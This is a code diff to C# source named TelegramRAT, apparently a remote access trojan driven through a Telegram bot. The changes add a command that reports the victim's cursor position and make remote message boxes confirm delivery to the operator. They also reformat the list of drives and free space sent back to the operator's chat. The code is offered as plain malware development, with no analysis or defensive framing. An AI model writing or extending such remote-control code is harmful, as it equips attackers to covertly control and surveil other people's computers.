@@ -186,7 +186,7 @@ namespace TelegramRAT
 
         static void InitializeCommands(List<BotCommand> CommandsList)
         {
-            //HELP Test::Pass
+            //HELP
             CommandsList.Add(new BotCommand
             {
                 Command = "help",
@@ -762,7 +762,15 @@ namespace TelegramRAT
                 {
                     Task.Run(() =>
                     {
-                        WinAPI.ShowMessageBox(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL | WinAPI.MsgBoxFlag.MB_ICONINFORMATION);
+                        try
+                        {
+                            WinAPI.ShowMessageBox(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL | WinAPI.MsgBoxFlag.MB_ICONINFORMATION);
+                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Sended!", replyToMessageId: model.Message.MessageId);
+                        }
+                        catch (Exception ex)
+                        {
+                            ReportError(model.Message, ex);
+                        }
                     });
                 }
 
@@ -1118,6 +1126,7 @@ namespace TelegramRAT
 
                 Description =
                 "This command has multiple usage.\n" +
+                "info - show info about cursor\n" +
                 "to - move mouse cursor to point on the primary screen\n" +
                 "by - move mouse by pixels\n" +
                 "click - click mouse button\n" +
@@ -1137,6 +1146,22 @@ namespace TelegramRAT
                     {
                         switch (model.Args[0].ToLower())
                         {
+                            case "i":
+                            case "info":
+                                string mouseInfo;
+                                Point cursorPos = new Point();
+                                if (WinAPI.GetCursorPos(out cursorPos))
+                                {
+                                    mouseInfo =
+                                    $"Cursor position: x:{cursorPos.X} y:{cursorPos.Y}";
+                                }
+                                else
+                                {
+                                    mouseInfo = "Unable to get info about cursor";
+                                }
+                                Bot.SendTextMessageAsync(model.Message.Chat.Id, mouseInfo, ParseMode.Html, replyToMessageId: model.Message.MessageId);
+                                return;
+
                             case "to":
                                 mouseSimulator.MoveMouseTo(Convert.ToDouble(model.Args[1]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Width),
                                 Convert.ToDouble(model.Args[2]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Height));
@@ -1853,22 +1878,21 @@ namespace TelegramRAT
                             StringBuilder drivesStr = new StringBuilder();
                             foreach (DriveInfo drive in drives)
                             {
-                                drivesStr.Append(
-                                    $"Name: {drive.Name}\n" +
-                                    $"IsReady: {drive.IsReady}\n");
+                                drivesStr.AppendLine($"Name: {drive.Name}");
                                 if (drive.IsReady)
                                 {
-                                    drivesStr.Append(
-                                    $"Label: {drive.VolumeLabel}\n" +
+                                    drivesStr.AppendLine(
+                                    $"Label: <b>{drive.VolumeLabel}</b>\n" +
                                     $"Type: {drive.DriveType}\n" +
                                     $"Format: {drive.DriveFormat}\n" +
                                     $"Avaliable Space: {string.Format("{0:F1}", drive.TotalFreeSpace / 1024 / 1024 / (float)1024)}/" +
-                                    $"{drive.TotalSize / 1024 / 1024 / 1024}GB\n\n");
+                                    $"{drive.TotalSize / 1024 / 1024 / 1024}GB");
                                 }
                                 else
                                 {
-                                    drivesStr.AppendLine();
+                                    drivesStr.AppendLine("<i>Drive is not ready, data is unavaliable</i>");
                                 }
+                                drivesStr.AppendLine();
                             }
                             Bot.SendTextMessageAsync(model.Message.Chat.Id, string.Join(string.Empty, drivesStr.ToString().Take(4096).ToArray()), ParseMode.Html, replyToMessageId: model.Message.MessageId);
                         }
